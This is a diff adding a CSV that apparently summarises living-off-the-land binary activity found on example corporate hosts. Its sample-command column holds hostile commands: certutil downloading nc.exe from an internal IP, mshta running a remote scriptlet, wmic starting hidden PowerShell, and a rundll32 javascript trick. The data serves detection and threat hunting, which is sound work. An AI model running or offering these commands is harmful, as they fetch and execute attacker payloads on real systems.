@@ -1,0 +1,5 @@
+FileName,Count,Devices,SampleCommands
+certutil.exe,3,"[""wks-18.corp.example.com"",""wks-06.corp.example.com""]","[""certutil.exe -urlcache -split -f http://10.10.25.99/nc.exe C:\\Windows\\Temp\\nc.exe""]"
+mshta.exe,1,"[""srv-05.corp.example.com""]","[""mshta.exe javascript:a=(GetObject('script:http://10.10.25.99/hta.sct')).Exec();close();""]"
+wmic.exe,5,"[""wks-05.corp.example.com"",""wks-24.corp.example.com"",""wks-14.corp.example.com""]","[""wmic process call create 'powershell.exe -NoP -W Hidden'"",""wmic /node:192.168.75.20 os get""]"
+rundll32.exe,2,"[""wks-18.corp.example.com""]","[""rundll32.exe javascript:\"".\\mshtml,RunHTMLApplication \";document.write()""]"
